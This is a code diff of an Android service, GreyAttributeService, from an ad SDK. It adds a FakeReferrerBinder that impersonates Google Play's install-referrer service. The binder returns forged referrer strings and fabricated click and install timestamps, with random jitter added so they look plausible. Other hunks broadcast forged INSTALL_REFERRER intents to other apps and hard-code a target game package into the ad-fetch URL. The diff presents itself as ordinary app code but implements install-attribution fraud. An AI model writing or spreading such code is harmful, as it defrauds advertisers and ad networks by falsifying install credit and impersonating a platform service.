@@ -3,13 +3,11 @@ package com.polestar.grey;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
-import android.content.SharedPreferences;
 import android.net.Uri;
+import android.os.Bundle;
 import android.os.IBinder;
 import android.os.SystemClock;
-import android.support.annotation.IntDef;
 import android.support.annotation.Nullable;
-import android.support.compat.BuildConfig;
 import android.text.TextUtils;
 
 import com.google.gson.Gson;
@@ -26,6 +24,7 @@ import java.net.URLEncoder;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Map;
+import java.util.Random;
 import java.util.UUID;
 
 import nativesdk.ad.common.app.Constants;
@@ -36,6 +35,8 @@ import nativesdk.ad.common.database.AdInfo;
 import nativesdk.ad.common.utils.DeviceUtil;
 import nativesdk.ad.common.utils.PreferenceUtils;
 import nativesdk.ad.common.utils.UrlUtils;
+
+import com.google.android.finsky.externalreferrer.*;
 
 /**
  * Created by guojia on 2018/2/10.
@@ -49,10 +50,34 @@ public class GreyAttributeService extends Service {
                     + "&deviceid={devId}&sdkversion=2.2.7.092217&pkg={mypkg}&ua={ua}&os=android&language={lang}&" +
                     "reqId={reqid}&maid={maid}&gpid={gpid}";
 
+    class FakeReferrerBinder extends IGetInstallReferrerService.Stub{
+        String pkg;
+        FakeReferrerBinder(Intent intent) {
+            pkg = intent.getAction();
+        }
+        @Override
+        public String getInterfaceDescriptor() {
+            return "com.google.android.finsky.externalreferrer.IGetInstallReferrerService";
+        }
+
+        @Override
+        public Bundle getInstallReferrer() {
+            AdLog.d("GreyAttribute", "call service getInstallReferrer");
+            Bundle fake = new Bundle();
+            long click = GreyAttribute.getClickTimeStamp(GreyAttributeService.this, pkg);
+            fake.putLong("referrer_click_timestamp_seconds", click);
+            long current = System.currentTimeMillis();
+            int random = new Random().nextInt(1000);
+            long install = click + (current - click)/2 + random;
+            fake.putLong("install_begin_timestamp_seconds", install);
+            fake.putString("install_referrer", GreyAttribute.getReferrer(GreyAttributeService.this, pkg));
+            return fake;
+        }
+    }
     @Nullable
     @Override
     public IBinder onBind(Intent intent) {
-        return null;
+        return new FakeReferrerBinder(intent);
     }
 
     @Override
@@ -69,7 +94,7 @@ public class GreyAttributeService extends Service {
         } else if(GreyAttribute.ACTION_ATTRIBUTE.equals(intent.getAction())){
             final String pkg = intent.getStringExtra(Intent.EXTRA_PACKAGE_NAME);
             String refer = GreyAttribute.getReferrer(this,pkg);
-            if (refer != null) {
+            if (!TextUtils.isEmpty(refer)) {
                 Intent br = new Intent("com.android.vending.INSTALL_REFERRER");
                 br.putExtra("referrer", refer);
                 br.setFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES);
@@ -90,7 +115,7 @@ public class GreyAttributeService extends Service {
             String aid = DeviceUtil.getAndroidId(ctx);
             String ua = URLEncoder.encode(PreferenceUtils.getUserAgent(ctx), "UTF-8");
             String gpid = DeviceUtil.getGoogleAdvertisingId(ctx);
-            String reqUrl = FETCH_URL.replace("{adpkg}", pkg).replace("{devId}", devId).replace("{mypkg}", mypkg)
+            String reqUrl = FETCH_URL.replace("{adpkg}", "com.yygames.ggplay.lzgtw").replace("{devId}", devId).replace("{mypkg}", mypkg)
                     .replace("{ua}", ua).replace("{lang}", lang).replace("{reqid}", reqId).replace("{maid}", aid)
                     .replace("{gpid}", gpid);
 
@@ -109,8 +134,8 @@ public class GreyAttributeService extends Service {
                         AdInfo info = new AdInfo(data, Constants.ApxAdType.APPWALL);
                         AdLog.d(TAG, "AdInfo: " + info.clkurl);
                         String referrer = doClick(info);
-                        AdLog.d(TAG, "referrer: " + referrer);
                         if (referrer != null) {
+                            AdLog.d(TAG, "referrer: " + referrer);
                             GreyAttribute.putReferrer(this, pkg, referrer);
                             break;
                         }
